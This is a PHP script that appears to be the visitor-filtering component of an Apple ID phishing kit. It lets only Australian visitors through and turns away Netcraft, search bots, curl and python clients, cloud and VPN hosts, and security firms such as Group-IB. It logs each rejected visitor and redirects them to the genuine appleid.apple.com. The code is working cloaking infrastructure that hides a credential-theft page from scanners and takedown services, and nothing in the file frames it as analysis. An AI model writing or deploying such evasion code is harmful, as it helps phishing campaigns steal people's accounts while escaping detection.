<?php
function inStr($s, $as){
    $s = strtoupper($s);
    if(!is_array($as)) $as=array($as);
    for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
    return false;
}
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip.""));
$nama_negara = $details->geoplugin_countryName;
$hostbyaddr = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$referer = $_SERVER['HTTP_REFERER'];
if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
$msg = "
<font color='red'>Denied Visitor (Netcraft) |  IP : ".$v_ip." - Date : ".$v_date." - Browser : ".$v_agent." - Host : ".$v_host." <br></font>";
$file=fopen("assets/logs/visitorlog.html","a");
fwrite($file, $msg);
fclose($file);
        header("Location: https://www.google.ca/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwi_yey8kvzJAhWwj4MKHVp5ALcQFggcMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww");
		die();
} 
if ($nama_negara != "Australia") {
$msg = "
<font color='red'>Denied Visitor (Not From Australia) |  IP : ".$v_ip." - Date : ".$v_date." - Browser : ".$v_agent." - Host : ".$v_host." - Country : ".$nama_negara." <br></font>";
$file=fopen("assets/logs/visitorlog.html","a");
fwrite($file, $msg);
fclose($file);
        header("Location: https://www.google.ca/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwi_yey8kvzJAhWwj4MKHVp5ALcQFggcMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww");
        die();
}
if (inStr($v_agent,"google") || inStr($v_agent,"bot") || inStr($v_agent,"bing") || inStr($v_agent,"yahoo") || inStr($v_agent,"msn") || inStr($v_agent,"mail") || inStr($v_agent,"curl") || inStr($v_agent,"github") || inStr($v_agent,"api") || inStr($v_agent,"domain") || inStr($v_agent,"virus") || inStr($v_agent,"http") || inStr($v_agent,"python") || !inStr($v_agent,"Mozilla/5.0") || $v_agent == null || $v_agent == "" || inStr($v_agent,"PhantomJS") || inStr($v_agent,"X11")) {
$msg = "
<font color='red'>Denied Visitor (UserAgent) |  IP : ".$v_ip." - Date : ".$v_date." - Browser : ".$v_agent." - Host : ".$v_host." <br></font>";
$file=fopen("assets/logs/visitorlog.html","a");
fwrite($file, $msg);
fclose($file);
        header("Location: https://www.google.ca/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwi_yey8kvzJAhWwj4MKHVp5ALcQFggcMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww");
		die();
}
if (inStr($hostbyaddr,"amazonaws") || inStr($hostbyaddr,"google") || inStr($hostbyaddr,"tor") || inStr($hostbyaddr,"bot") || inStr($hostbyaddr,"yandex") || inStr($hostbyaddr,"mail") || inStr($hostbyaddr,"roamsite") || inStr($hostbyaddr,"scaleway") || inStr($hostbyaddr,"vultr") || inStr($hostbyaddr,"linode") || inStr($hostbyaddr,"codero.net") || inStr($hostbyaddr,"sl-reverse.com") || inStr($hostbyaddr,"poneytelecom") || inStr($hostbyaddr,"ccanet.co.uk") || inStr($hostbyaddr,"colocrossing.com") || inStr($hostbyaddr,"coloup.com") || inStr($hostbyaddr,"blockone") || inStr($hostbyaddr,"quebec") || inStr($hostbyaddr,"sec.la") || inStr($hostbyaddr,"hexillion.com") || inStr($hostbyaddr,"ltx71.com") || inStr($hostbyaddr,"CentralOps") || inStr($hostbyaddr,"blackfire") || inStr($hostbyaddr,".club") || inStr($hostbyaddr,".eu") || inStr($hostbyaddr,"quade.co") || inStr($hostbyaddr,"cloudradium.com") || inStr($hostbyaddr,"spider") || inStr($hostbyaddr,"lipperhey.com") || inStr($hostbyaddr,"startdedicated.net") || inStr($hostbyaddr,"chlooe.com") || inStr($hostbyaddr,"quadranet.com") || inStr($hostbyaddr,"visit.keznews.com") || inStr($hostbyaddr,"ruraltel.net") || inStr($hostbyaddr,"static.belong.com.au") || inStr($hostbyaddr,"clients.your-server.de") || inStr($hostbyaddr,"amsterdamresidential.com") || inStr($hostbyaddr,"oso.orange-labs.fr") || inStr($hostbyaddr,"versanet.de") || inStr($hostbyaddr,"unassigned") || inStr($hostbyaddr,"16clouds.com") || inStr($hostbyaddr,"reverse.completel.net") || inStr($hostbyaddr,"hitlate.com") || inStr($hostbyaddr,"123-virtual.com") || inStr($hostbyaddr,"digiweb.ie") || inStr($hostbyaddr,"internode.on.net") || inStr($hostbyaddr,"163data.com.cn") || inStr($hostbyaddr,"pacswitch.com") || inStr($hostbyaddr,"dvois.com") || inStr($hostbyaddr,"alliancebroadband.in") || inStr($hostbyaddr,"websense.com") || inStr($hostbyaddr,"oldham.ru") || inStr($hostbyaddr,"xo.net") || inStr($hostbyaddr,"level3.net") || inStr($hostbyaddr,".on.net") || inStr($hostbyaddr,"aircel.co.in") || inStr($hostbyaddr,"ny.adsl") || inStr($hostbyaddr,"cloudmosa.com") || inStr($hostbyaddr,"demur676.vds") || inStr($hostbyaddr,"as9105.com") || inStr($hostbyaddr,"rima-tde.net") || inStr($hostbyaddr,"tedata.net") || inStr($hostbyaddr,"plob.cz") || inStr($hostbyaddr,"in-addr.arpa") || inStr($hostbyaddr,"localhost") || inStr($hostbyaddr,"static.upc.ch") || inStr($hostbyaddr,"hns.net.in") || inStr($hostbyaddr,"airtel.com") || inStr($hostbyaddr,"seflow.it") || inStr($hostbyaddr,"tpnet.pl") || inStr($hostbyaddr,".in") || inStr($hostbyaddr,".mg") || inStr($hostbyaddr,".de") || inStr($hostbyaddr,".vn") || inStr($hostbyaddr,".su") || inStr($hostbyaddr,".ro") || inStr($hostbyaddr,".ru") || inStr($hostbyaddr,"bezeqint.net") || inStr($hostbyaddr,"comcastbusiness.net") || inStr($hostbyaddr,"dion.ne.jp") || inStr($hostbyaddr,"group-ib.com") || inStr($hostbyaddr,"ipvanish.com") || inStr($hostbyaddr,"northamericancoax.com") || inStr($hostbyaddr,"securedservers.com") || inStr($hostbyaddr,"tatintel.com") || inStr($hostbyaddr,"vladlink.net") || inStr($hostbyaddr,"365localanews.com") || inStr($hostbyaddr,"bell.ca") || inStr($hostbyaddr,"comcast.net") || inStr($hostbyaddr,"milleniervices.net") || inStr($hostbyaddr,"res.rr.com") || inStr($hostbyaddr,".br")) {
$msg = "
<font color='red'>Denied Visitor (Host) |  IP : ".$v_ip." - Date : ".$v_date." - Browser : ".$v_agent." - Host : ".$v_host." <br></font>";
$file=fopen("assets/logs/visitorlog.html","a");
fwrite($file, $msg);
fclose($file);
        header("Location: https://www.google.ca/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwi_yey8kvzJAhWwj4MKHVp5ALcQFggcMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww");
		die();
}
$sitename = $_SERVER["SERVER_NAME"];
if (inStr($referer,$sitename) || inStr($referer,"google") || inStr($referer,"127.0.0.1")) {
$msg = "
<font color='red'>Denied Visitor (Referer) |  IP : ".$v_ip." - Date : ".$v_date." - Browser : ".$v_agent." - Host : ".$v_host." - Referer : ".$referer."<br></font>";
$file=fopen("assets/logs/visitorlog.html","a");
fwrite($file, $msg);
fclose($file);
        header("Location: https://www.google.ca/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwi_yey8kvzJAhWwj4MKHVp5ALcQFggcMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww");
		die();
}
?>